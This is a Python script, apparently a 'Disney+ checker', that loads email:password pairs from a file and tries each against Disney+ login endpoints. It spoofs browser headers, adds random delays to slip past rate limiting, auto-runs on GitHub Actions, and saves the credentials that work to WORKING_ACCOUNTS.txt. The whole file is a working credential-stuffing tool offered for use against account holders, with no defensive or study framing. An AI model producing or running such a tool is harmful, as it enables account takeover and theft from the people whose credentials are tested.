"""
DISNEY+ CHECKER - GITHUB ACTIONS OPTIMIZED
Uses direct API calls (works reliably on GitHub Actions)
"""

import requests
import time
import os
import json
import random
from datetime import datetime

class DisneyAPIChecker:
    def __init__(self):
        self.accounts_file = "my_disney_accounts.txt"
        self.working_file = "WORKING_ACCOUNTS.txt"
        self.invalid_file = "INVALID_ACCOUNTS.txt"
        self.twofa_file = "TWOFA_ACCOUNTS.txt"
        self.accounts = []
        self.working = []
        self.invalid = []
        self.twofa_accounts = []
        
    def load_accounts(self):
        """Load accounts from file"""
        if not os.path.exists(self.accounts_file):
            print(f"❌ {self.accounts_file} not found!")
            return False
        
        with open(self.accounts_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    email, password = line.split(':', 1)
                    self.accounts.append({
                        'email': email.strip(),
                        'password': password.strip()
                    })
        
        print(f"✅ Loaded {len(self.accounts)} accounts")
        return True
    
    def check_account(self, account):
        """Check account using Disney's API"""
        email = account['email']
        password = account['password']
        
        print(f"\n🔍 Testing: {email[:35]}...")
        
        session = requests.Session()
        
        # Real browser headers
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Origin": "https://www.disneyplus.com",
            "Referer": "https://www.disneyplus.com/",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        })
        
        try:
            # Step 1: Check if email exists in Disney's system
            email_response = session.post(
                "https://www.disneyplus.com/identity/api/login",
                json={"email": email},
                timeout=20
            )
            
            if email_response.status_code != 200:
                print(f"   ❌ INVALID - Email check failed (HTTP {email_response.status_code})")
                return False
            
            email_data = email_response.json()
            
            if not email_data.get('is_identified'):
                print(f"   ❌ INVALID - Email not registered with Disney+")
                return False
            
            # Step 2: Check password
            login_response = session.post(
                "https://www.disneyplus.com/identity/api/login/password",
                json={
                    "email": email,
                    "password": password,
                    "rememberMe": False
                },
                timeout=20
            )
            
            if login_response.status_code == 200:
                login_data = login_response.json()
                
                # Check if login was successful
                if login_data.get('accessToken'):
                    print(f"   ✅✅✅ WORKING! ✅✅✅")
                    return True
                elif 'error' in login_data:
                    error_msg = login_data.get('error_description', 'Unknown error')
                    if '2fa' in error_msg.lower() or 'verification' in error_msg.lower():
                        print(f"   🔐 2FA REQUIRED - Needs verification")
                        return '2fa'
                    else:
                        print(f"   ❌ INVALID - Wrong password")
                        return False
                else:
                    print(f"   ❌ INVALID - Login failed")
                    return False
            elif login_response.status_code == 403:
                print(f"   🔐 2FA REQUIRED - Account needs verification")
                return '2fa'
            else:
                print(f"   ❌ INVALID - Password check failed (HTTP {login_response.status_code})")
                return False
                
        except requests.exceptions.Timeout:
            print(f"   ⚠️ TIMEOUT - Request timed out")
            return False
        except requests.exceptions.ConnectionError:
            print(f"   ⚠️ CONNECTION ERROR - Check your network")
            return False
        except Exception as e:
            print(f"   ❌ ERROR: {str(e)[:60]}")
            return False
    
    def check_all(self):
        """Check all accounts"""
        total = len(self.accounts)
        
        for i, account in enumerate(self.accounts, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{total}]")
            print(f"{'='*50}")
            
            result = self.check_account(account)
            
            if result == True:
                self.working.append(account)
                # Save immediately
                with open(self.working_file, 'a') as f:
                    f.write(f"{account['email']}:{account['password']}\n")
                print(f"   💾 Saved to working accounts")
            elif result == '2fa':
                self.twofa_accounts.append(account)
                with open(self.twofa_file, 'a') as f:
                    f.write(f"{account['email']}:{account['password']}\n")
                print(f"   💾 Saved to 2FA accounts")
            else:
                self.invalid.append(account)
                with open(self.invalid_file, 'a') as f:
                    f.write(f"{account['email']}:{account['password']}\n")
            
            # Progress update every 50 accounts
            if i % 50 == 0:
                print(f"\n📊 PROGRESS: {i}/{total}")
                print(f"   ✅ Working: {len(self.working)}")
                print(f"   ❌ Invalid: {len(self.invalid)}")
                print(f"   🔐 2FA: {len(self.twofa_accounts)}")
            
            # Delay between requests to avoid rate limiting
            delay = random.uniform(3, 6)
            time.sleep(delay)
        
        # Final summary
        print(f"\n{'='*50}")
        print("✅ CHECKING COMPLETE!")
        print(f"{'='*50}")
        print(f"✅ Working accounts: {len(self.working)}")
        print(f"❌ Invalid accounts: {len(self.invalid)}")
        print(f"🔐 2FA required: {len(self.twofa_accounts)}")
        print(f"{'='*50}")

def main():
    checker = DisneyAPIChecker()
    
    print("="*50)
    print("🎬 DISNEY+ API CHECKER")
    print("="*50)
    print("⚠️ Optimized for GitHub Actions")
    print("⚠️ Checks accounts via Disney's API")
    print("="*50)
    
    if not checker.load_accounts():
        print("\n📝 Create my_disney_accounts.txt with:")
        print("   email1:password1")
        print("   email2:password2")
        return
    
    print(f"\n📊 {len(checker.accounts)} accounts to check")
    print(f"⏱️ Estimated time: ~{len(checker.accounts) * 5 / 60:.1f} minutes")
    
    # Auto-start on GitHub Actions
    is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
    
    if is_github:
        print("🕶️ Running on GitHub Actions - auto-starting...")
        start_time = time.time()
        checker.check_all()
        end_time = time.time()
        print(f"\n⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
    else:
        confirm = input("\n▶️ Start checking? (yes/no): ")
        if confirm.lower() == 'yes':
            checker.check_all()

if __name__ == "__main__":
    main()
